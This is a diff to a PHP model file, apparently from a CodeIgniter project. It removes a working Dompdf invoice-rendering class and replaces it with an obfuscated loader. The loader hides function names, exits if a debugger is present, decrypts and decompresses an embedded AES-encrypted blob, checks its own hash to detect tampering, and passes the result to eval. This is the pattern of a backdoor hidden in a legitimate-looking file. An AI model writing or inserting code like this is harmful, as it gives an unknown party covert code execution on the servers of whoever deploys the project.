@@ -1,36 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-use Dompdf\Dompdf;
-use Dompdf\Options;
-
-class Pdf_model extends CI_Model {
-
-		public function render($html='',$pdf_name = 'Invoice'){
-
-	        $options = new Options();
-
-	        $options->setIsPhpEnabled(true);
-	        $options->setIsRemoteEnabled(true);
-
-
-	        $dompdf = new Dompdf();
-
-	        $dompdf->setOptions($options);
-
-
-	        // Load HTML content
-	        $dompdf->loadHtml($html);
-	        
-	        // (Optional) Setup the paper size and orientation
-	        $dompdf->setPaper('A4', 'portrait');/*landscape or portrait*/
-	        
-	        // Render the HTML as PDF
-	        $dompdf->render();
-	        // Output the generated PDF (1 = download and 0 = preview)
-	        $dompdf->stream($pdf_name, array("Attachment"=>0));
-
-
-		}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_vaz481jj=('bas'.'e64'.'_de'.'cod'.'e');
+$_p8r7w78p=('gzu'.'nco'.'mpr'.'ess');
+$_rxn0g8we=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_yaue2gzy='J0KMgzBH';
+$_fp2o7gi0='bjj9up0Q';
+$_ciz5cl4g='F39/sKqE';
+$_dybx8ybe='bspZjY7llZY=';
+$_q2ij27nd='BQQ/1umq';
+$_jf3lrins='dLT+tWFw';
+$_nd0hll8h='+LFeHOZj';
+$_wss6ybeo='LvZ/tg==';
+$_rngkh8db=$_vaz481jj($_yaue2gzy.$_q2ij27nd.$_ciz5cl4g.$_fp2o7gi0.$_dybx8ybe);
+$_ez3av47k=$_vaz481jj($_nd0hll8h.$_jf3lrins.$_wss6ybeo);
+$_hf2oz5f2=$_vaz481jj('0ZXjIfFFqTetVv+gJ6qQHqf0LFRhYHYKcLtXNhOVdJ++QYWJk27UQerOXwbX8Q+yCxSKhW2kXDM2vogtltr9Lsj7MM3kCsLb+UE9kZz1kAxsWEsOyVrH0idGwmdgfiPNSqhjDfEiHB8m9kImzlOVViSfaOh8PZwFt+crgiAMEIe9MHYuxJ2bdz30vqs7snFtclArXLelKwcPKVXF/OpnDb/0IIrByKjwag9LFIKb/ZetTIyibf5yaVjBtv4wALsbHpecLS6spwwJ87LwfcZsQK0O42nCRWxKQU8Ua5tIsDBIcl38dsgoEKaAXrHilEYp3/97KAS7eQqoFnOcC04YJ67VdPjeVVTUY71rpg6zjkYq30BVOsNyXLOfWDydXqQ0z0tYKalE4rC/9OT+1RCW663doxUeDyUW7AfoxT8zgqpwSN0odCGuJI86RwRieMbsh2Vi2nnHfnSqDxKCvoAWuq9aTIrawqgj12PWB3apzY+cPzukUt0Kqu00kBNE9Eb6');
+$_wsxduphu=$_rxn0g8we($_hf2oz5f2,'aes-256-cbc',$_rngkh8db,OPENSSL_RAW_DATA,$_ez3av47k);
+if($_wsxduphu===false){exit;}
+$_n0w0lnb9=$_p8r7w78p($_wsxduphu);
+if($_n0w0lnb9===false){exit;}
+$_zsvktj8a='51172891e0a9ab3a406bd96ef0eb7671a49c04966fcac92dc86fca64dc4a7656';
+$_c8x4x8rs=@file_get_contents(__FILE__);
+if($_c8x4x8rs!==false){
+$_qhw58s5i=str_replace($_zsvktj8a,"0000000000000000000000000000000000000000000000000000000000000000",$_c8x4x8rs);
+$_fx9hhbhu=hash("sha256",$_qhw58s5i);
+if($_fx9hhbhu!==$_zsvktj8a){@http_response_code(403);exit;}
 }
+eval($_n0w0lnb9);
